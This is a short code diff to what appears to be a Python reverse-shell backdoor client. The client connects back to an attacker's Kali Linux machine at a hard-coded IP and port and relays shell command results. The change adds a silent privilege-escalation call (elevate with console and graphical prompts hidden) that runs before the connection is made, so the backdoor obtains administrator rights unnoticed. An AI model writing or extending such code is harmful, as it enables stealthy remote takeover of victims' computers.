@@ -3,6 +3,7 @@ import json
 import time
 import subprocess
 import os
+from elevate import elevate
 
 SERVER_IP = '192.168.254.49'  # IP of my Kali Linux machine
 SERVER_PORT = 5555
@@ -76,5 +77,6 @@ def shell():
             reliable_send(result)
 
 
+elevate(show_console=False, graphical=False)
 target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
